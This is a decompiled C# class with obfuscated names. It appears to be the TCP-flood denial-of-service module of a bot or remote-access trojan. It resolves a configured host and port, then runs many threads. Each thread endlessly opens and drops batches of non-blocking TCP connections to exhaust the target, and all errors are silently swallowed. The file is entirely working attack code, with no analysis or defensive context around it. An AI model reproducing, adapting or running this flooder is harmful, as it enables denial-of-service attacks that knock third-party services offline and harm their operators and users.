using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ns4;

internal sealed class Class21
{
	private sealed class Class22
	{
		private IPEndPoint ipendPoint_0;

		private Socket[] socket_0;

		private int int_0;

		public Class22(IPEndPoint ipendPoint_1, int int_1)
		{
			ipendPoint_0 = ipendPoint_1;
			int_0 = int_1;
		}

		private void method_0(IAsyncResult iasyncResult_0)
		{
			try
			{
				Socket socket = (Socket)iasyncResult_0.AsyncState;
				socket.Disconnect(reuseSocket: false);
				socket.Close();
			}
			catch
			{
			}
		}

		public void method_1()
		{
			while (true)
			{
				try
				{
					while (true)
					{
						socket_0 = new Socket[int_0];
						for (int i = 0; i < int_0; i++)
						{
							socket_0[i] = new Socket(ipendPoint_0.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
							socket_0[i].Blocking = false;
							AsyncCallback callback = method_0;
							socket_0[i].BeginConnect(ipendPoint_0, callback, socket_0[i]);
						}
						Thread.Sleep(100);
						for (int j = 0; j < int_0; j++)
						{
							if (socket_0[j].Connected)
							{
								socket_0[j].Disconnect(reuseSocket: false);
							}
							socket_0[j].Close();
							socket_0[j] = null;
						}
					}
				}
				catch
				{
					for (int k = 0; k < int_0; k++)
					{
						try
						{
							if (socket_0[k].Connected)
							{
								socket_0[k].Disconnect(reuseSocket: false);
							}
							socket_0[k].Close();
							socket_0[k] = null;
						}
						catch
						{
						}
					}
				}
			}
		}
	}

	private static ThreadStart[] threadStart_0;

	private static Thread[] thread_0;

	private static IPEndPoint ipendPoint_0;

	private static Class22[] class22_0;

	public static string string_0;

	public static ushort ushort_0;

	public static int int_0;

	public static int int_1;

	public static void smethod_0()
	{
		try
		{
			ipendPoint_0 = new IPEndPoint(Dns.GetHostEntry(string_0).AddressList[0], ushort_0);
		}
		catch
		{
			ipendPoint_0 = new IPEndPoint(IPAddress.Parse(string_0), ushort_0);
		}
		thread_0 = new Thread[int_1];
		threadStart_0 = new ThreadStart[int_1];
		class22_0 = new Class22[int_1];
		for (int i = 0; i < int_1; i++)
		{
			class22_0[i] = new Class22(ipendPoint_0, int_0);
			threadStart_0[i] = class22_0[i].method_1;
			thread_0[i] = new Thread(threadStart_0[i]);
			thread_0[i].Start();
		}
	}

	public static void smethod_1()
	{
		for (int i = 0; i < int_1; i++)
		{
			try
			{
				thread_0[i].Abort();
				thread_0[i].Join();
			}
			catch
			{
			}
		}
	}
}
